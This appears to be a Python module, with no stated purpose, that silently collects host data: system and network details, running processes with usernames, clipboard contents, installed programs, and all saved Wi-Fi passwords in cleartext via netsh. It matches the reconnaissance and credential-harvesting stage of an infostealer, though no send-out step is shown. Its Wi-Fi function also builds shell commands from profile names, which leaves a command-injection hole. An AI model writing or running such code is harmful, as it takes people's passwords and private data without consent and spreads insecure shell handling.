import platform
import socket
import psutil
import subprocess
import os

def get_system_info():
    try:
        return f"""System: {platform.system()}
Node Name: {platform.node()}
Release: {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}"""
    except Exception as e:
        return f"Error fetching system info: {e}"

def get_network_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        interfaces = psutil.net_if_addrs()
        return f"IP Address: {ip_address}\nNetwork Interfaces: {interfaces}"
    except Exception as e:
        return f"Error fetching network info: {e}"

def get_running_processes():
    try:
        result = ""
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            result += f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}\n"
        return result
    except Exception as e:
        return f"Error fetching processes: {e}"

def get_clipboard_data():
    try:
        import pyperclip
        return pyperclip.paste()
    except Exception as e:
        return f"Error reading clipboard: {e}"

def get_wifi_passwords():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
        wifi_info = ""
        for profile in profiles:
            try:
                result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode()
                for line in result.split("\n"):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        wifi_info += f"{profile}: {key}\n"
            except subprocess.CalledProcessError:
                wifi_info += f"{profile}: Could not retrieve password\n"
        return wifi_info
    except Exception as e:
        return f"Error fetching Wi-Fi passwords: {e}"

def get_installed_programs():
    try:
        output = subprocess.check_output("wmic product get name", shell=True, stderr=subprocess.DEVNULL).decode()
        return output
    except Exception as e:
        return f"Error fetching installed programs: {e}"
